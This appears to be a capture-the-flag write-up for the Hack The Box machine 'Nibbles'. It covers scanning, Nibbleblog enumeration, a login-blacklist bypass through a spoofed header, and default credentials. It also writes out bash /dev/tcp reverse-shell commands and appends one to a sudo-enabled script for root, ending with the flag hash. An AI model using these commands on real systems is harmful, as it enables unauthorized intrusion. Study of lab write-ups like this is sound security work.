## Scanning
### Initial Scan
```sh
nmap 10.129.157.37 -F -v -oA Logs/Initial 
```
![[Pasted image 20240605190128.png | ]]
### Port Scan
> [!Delayed]
> Took too much time to complete. Was not complete even after I completed the challenge.
### Aggressive Scan
```sh
nmap 10.129.157.37 -p 22,80 -A -T4 -v -oA Logs/AggressiveScan
```
![[Pasted image 20240605190038.png|]]
<br>
---
## Enumeration 
```sh
nmap 10.129.157.37 -sC -sV -p 80 -v -oA Logs/80-HTTPScriptScan
```
![[Pasted image 20240605190756.png|]]

```sh
searchsploit -t Apache 2.4.18 
```
![[Pasted image 20240605191553.png|]]

![[Pasted image 20240605191705.png|]]

![[Pasted image 20240605191745.png|]]

Found a Directory from page source 

![[Pasted image 20240605192440.png|700x350]]
Visited `/nibbleblog` directory. found nothing much in there

```sh
gobuster dir -u http://10.129.157.37 -w /usr/share/wordlists/dirb/common.txt -o ./Logs/80-Gobuster
```
![[Pasted image 20240605192300.png|]]

```sh
gobuster dir -u http://10.129.157.37/nibbleblog -w /usr/share/wordlists/dirb/common.txt -o ./Logs/80-Gobuster_nibbleblog
```

![[Pasted image 20240605192726.png|]]

```url
http://10.129.157.37/nibbleblog/admin/
```
![[Pasted image 20240605193043.png|]]
```url
http://10.129.157.37/nibbleblog/content/

http://10.129.157.37/nibbleblog/content/private/users.xml
http://10.129.157.37/nibbleblog/content/private/config.xml
```
![[Pasted image 20240605193242.png|]]

![[Pasted image 20240605193314.png|]]
![[Pasted image 20240605193406.png|]]
Found some sensitive information like username
> [!Sensitive Information]
>username:  admin@nibbles.com
> mail id: noreply@10.10.10.134

```url
http://10.129.157.37/nibbleblog/languages/
```
![[Pasted image 20240605193604.png|]]

```url
http://10.129.157.37/nibbleblog/plugins/
```
![[Pasted image 20240605193651.png|]]```

```url
http://10.129.157.37/nibbleblog/themes/
```
![[Pasted image 20240605193840.png|]]
```url
http://10.129.157.37/nibbleblog/README
```
![[Pasted image 20240605194021.png|]]
> [! Sensitive Information]
> Nibbleblog Version v4.0.3
> Code Name: Coffee

```sh
searchsploit -t nibbleblog 4.0.3   
```
![[Pasted image 20240605195833.png|]]

```url
http://10.129.157.37/nibbleblog/admin.php
```
![[Pasted image 20240605194204.png|]]
> [! Sensitive information]
> Admin login page found

![[Pasted image 20240605194754.png|]]
Blacklist protection enabled for user brute force
Max 5 failed login attempts allowed

Added `X-Forwarded-By: 127.0.0.1` in request header to bypass waf.
![[Pasted image 20240605195517.png|]]
> [!Credential]
> admin // nibbles

```url
https://www.exploit-db.com/exploits/38489
```
![[Pasted image 20240605200526.png|]]

```sh
https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/
```
![[Pasted image 20240605200614.png|]]
<br>
---
## Initial Foothold
![[Pasted image 20240605201319.png|]]

![[Pasted image 20240605201950.png|]]

![[Pasted image 20240605202410.png|]]

![[Pasted image 20240605202831.png|]]

![[Pasted image 20240605202857.png|]]

![[Pasted image 20240605202923.png|]]
<br>
---
## Privilege Escalation
![[Pasted image 20240605203108.png|]]

![[Pasted image 20240605203135.png|]]
monitor.sh file had sudo NOPASSWD permission. So we could execute this file with any user without giving the password.
![[Pasted image 20240605204650.png|]]

```sh
nc -nvlp 1337
```
![[Pasted image 20240605205005.png|]]

```sh
bash -c 'bash -i >& /dev/tcp/10.10.14.77/1337 0>&1'
```
![[Pasted image 20240605204807.png|]]

![[Pasted image 20240605205103.png|]]

![[Pasted image 20240605212613.png|]]

```sh
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.77/1234 0>&1'" | tee -a monitor.sh
```
![[Pasted image 20240605212733.png|]]

```sh
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```
![[Pasted image 20240605212953.png|]]

```sh
nc -nvlp 1234
```
![[Pasted image 20240605213109.png|]]
> [!root.txt]
> de5e5d6619862a8aa5b9b212314e0cdd